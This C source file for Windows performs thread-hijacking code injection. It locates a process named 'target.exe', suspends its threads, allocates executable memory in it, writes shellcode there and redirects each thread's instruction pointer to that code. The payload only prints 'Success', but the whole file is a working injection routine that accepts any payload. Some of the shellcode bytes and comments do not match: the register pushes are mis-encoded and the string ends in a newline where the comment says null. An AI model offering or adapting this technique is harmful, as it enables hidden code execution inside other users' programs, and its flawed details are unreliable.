#include <Windows.h>
#include <TlHelp32.h>

#define GETSTDHANDLEMARKER 0xaa
#define WRITEFILEMARKER 0xbb

DWORD getPID(LPCTSTR name);
DWORD getMarker(UCHAR* shellcode, int marker, size_t len);

int main()
{
	LPCTSTR sTargetProcessName = L"target.exe";

	UCHAR shellcode[] = {
		// save registers & flags
		0x9c, // pushfq
		0x50, 0x51, 0x52, 0x47, 0x50, 0x47, 0x51, // push rax, rcx, rdx, r8, r9

		// setup WriteFile() arguments
		// lpBuffer (pointer to "Success\0")
		0x48, 0xb8, 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x0a, // mov rax, "Success\0"
		0x50, // push rax
		0x48, 0x89, 0xe2, // mov rdx, rsp

		// lpOverlapped (NULL)
		0x48, 0x83, 0xec, 0x28, // sub rsp, 0x28 (shadow + 5th arg of WriteFile())
		0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, // mov qword ptr[rsp + 20h], 0

		// hFile (stdout)
		0x48, 0xb9, 0xf5, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // mov rcx, -11
		0x48, 0xb8, GETSTDHANDLEMARKER, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <address of GetStdHandle()>
		0xff, 0xd0, // call rax
		0x48, 0x89, 0xc1, // mov rcx, rax

		// nNumberOfBytesToWrite (8)
		0x49, 0xc7, 0xc0, 0x08, 0x00, 0x00, 0x00, // mov r8, 0x08

		// lpNumberOfBytesWritten (NULL)
		0x4d, 0x31, 0xc9, // xor r9, r9		

		// call WriteFile()
		0x48, 0xb8, WRITEFILEMARKER, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <address of WriteFile()>
		0xff, 0xd0, // call rax

		// close up stack
		0x48, 0x83, 0xc4, 0x30, // add rsp, 30

		// restore registers & flags
		0x47, 0x59, 0x47, 0x58, 0x5a, 0x59, 0x58, // pop r9, r8, rdx, rcx, rax
		0x9d, // popfq

		// ret
		0xc3
	};

	// populate shellcode with address of GetStdHandle() & WriteFile()
	DWORD dwGetStdHandleOffset = getMarker(shellcode, GETSTDHANDLEMARKER, sizeof(shellcode));
	DWORD dwWriteFileOffset = getMarker(shellcode, WRITEFILEMARKER, sizeof(shellcode));

	// populate GetStdHandle()
	HMODULE hKernel32 = GetModuleHandle((LPCTSTR)L"kernel32");
	FARPROC fpGetStdHandle = GetProcAddress(hKernel32, (LPCSTR)"GetStdHandle");

	for (size_t i = 0; i < sizeof(DWORD_PTR); i++)
		shellcode[dwGetStdHandleOffset + i] = ((long long)fpGetStdHandle >> 8 * i) & 0xff;

	// populate WriteFile()
	FARPROC fpWriteFile = GetProcAddress(hKernel32, (LPCSTR)"WriteFile");

	for (size_t i = 0; i < sizeof(DWORD_PTR); i++)
		shellcode[dwWriteFileOffset + i] = ((long long)fpWriteFile >> 8 * i) & 0xff;

	// find target PID
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hProcessSnapshot, &pe32);

	DWORD dwTargetPID;
	do {
		if (0 == lstrcmp(sTargetProcessName, pe32.szExeFile)) {
			dwTargetPID = pe32.th32ProcessID;
			CloseHandle(hProcessSnapshot);
			break;
		}
	} while (Process32Next(hProcessSnapshot, &pe32));

	// pick a thread
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	Thread32First(hThreadSnapshot, &te32);

	do {
		if (dwTargetPID == te32.th32OwnerProcessID) {
			// suspend target thread
			DWORD dwTargetThreadID = te32.th32ThreadID;
			CloseHandle(hThreadSnapshot);
			HANDLE hTargetThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, dwTargetThreadID);
			SuspendThread(hTargetThread);

			// get thread context
			CONTEXT cTargetThreadContext;
			cTargetThreadContext.ContextFlags = CONTEXT_FULL;
			GetThreadContext(hTargetThread, &cTargetThreadContext);

			// save return address
			HANDLE hTargetProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwTargetPID);
			cTargetThreadContext.Rsp -= sizeof(DWORD_PTR);
			WriteProcessMemory(hTargetProcess, (LPVOID)cTargetThreadContext.Rsp, (LPCVOID)&cTargetThreadContext.Rip, sizeof(DWORD_PTR), NULL);

			// allocate space & write shellcode to target process
			LPVOID shellcodeAddress = VirtualAllocEx(hTargetProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			WriteProcessMemory(hTargetProcess, shellcodeAddress, (LPCVOID)shellcode, sizeof(shellcode), NULL);

			// set new thread context & resume
			cTargetThreadContext.Rip = (DWORD64)shellcodeAddress;
			SetThreadContext(hTargetThread, &cTargetThreadContext);
			ResumeThread(hTargetThread);
			CloseHandle(hTargetThread);
		}
	} while (Thread32Next(hThreadSnapshot, &te32));

	return 0;
}

DWORD getMarker(UCHAR* shellcode, int marker, size_t len)
{
	for (DWORD i = 0; i < len; i++)
		if (marker == shellcode[i])
			return i;

	return 0;
}
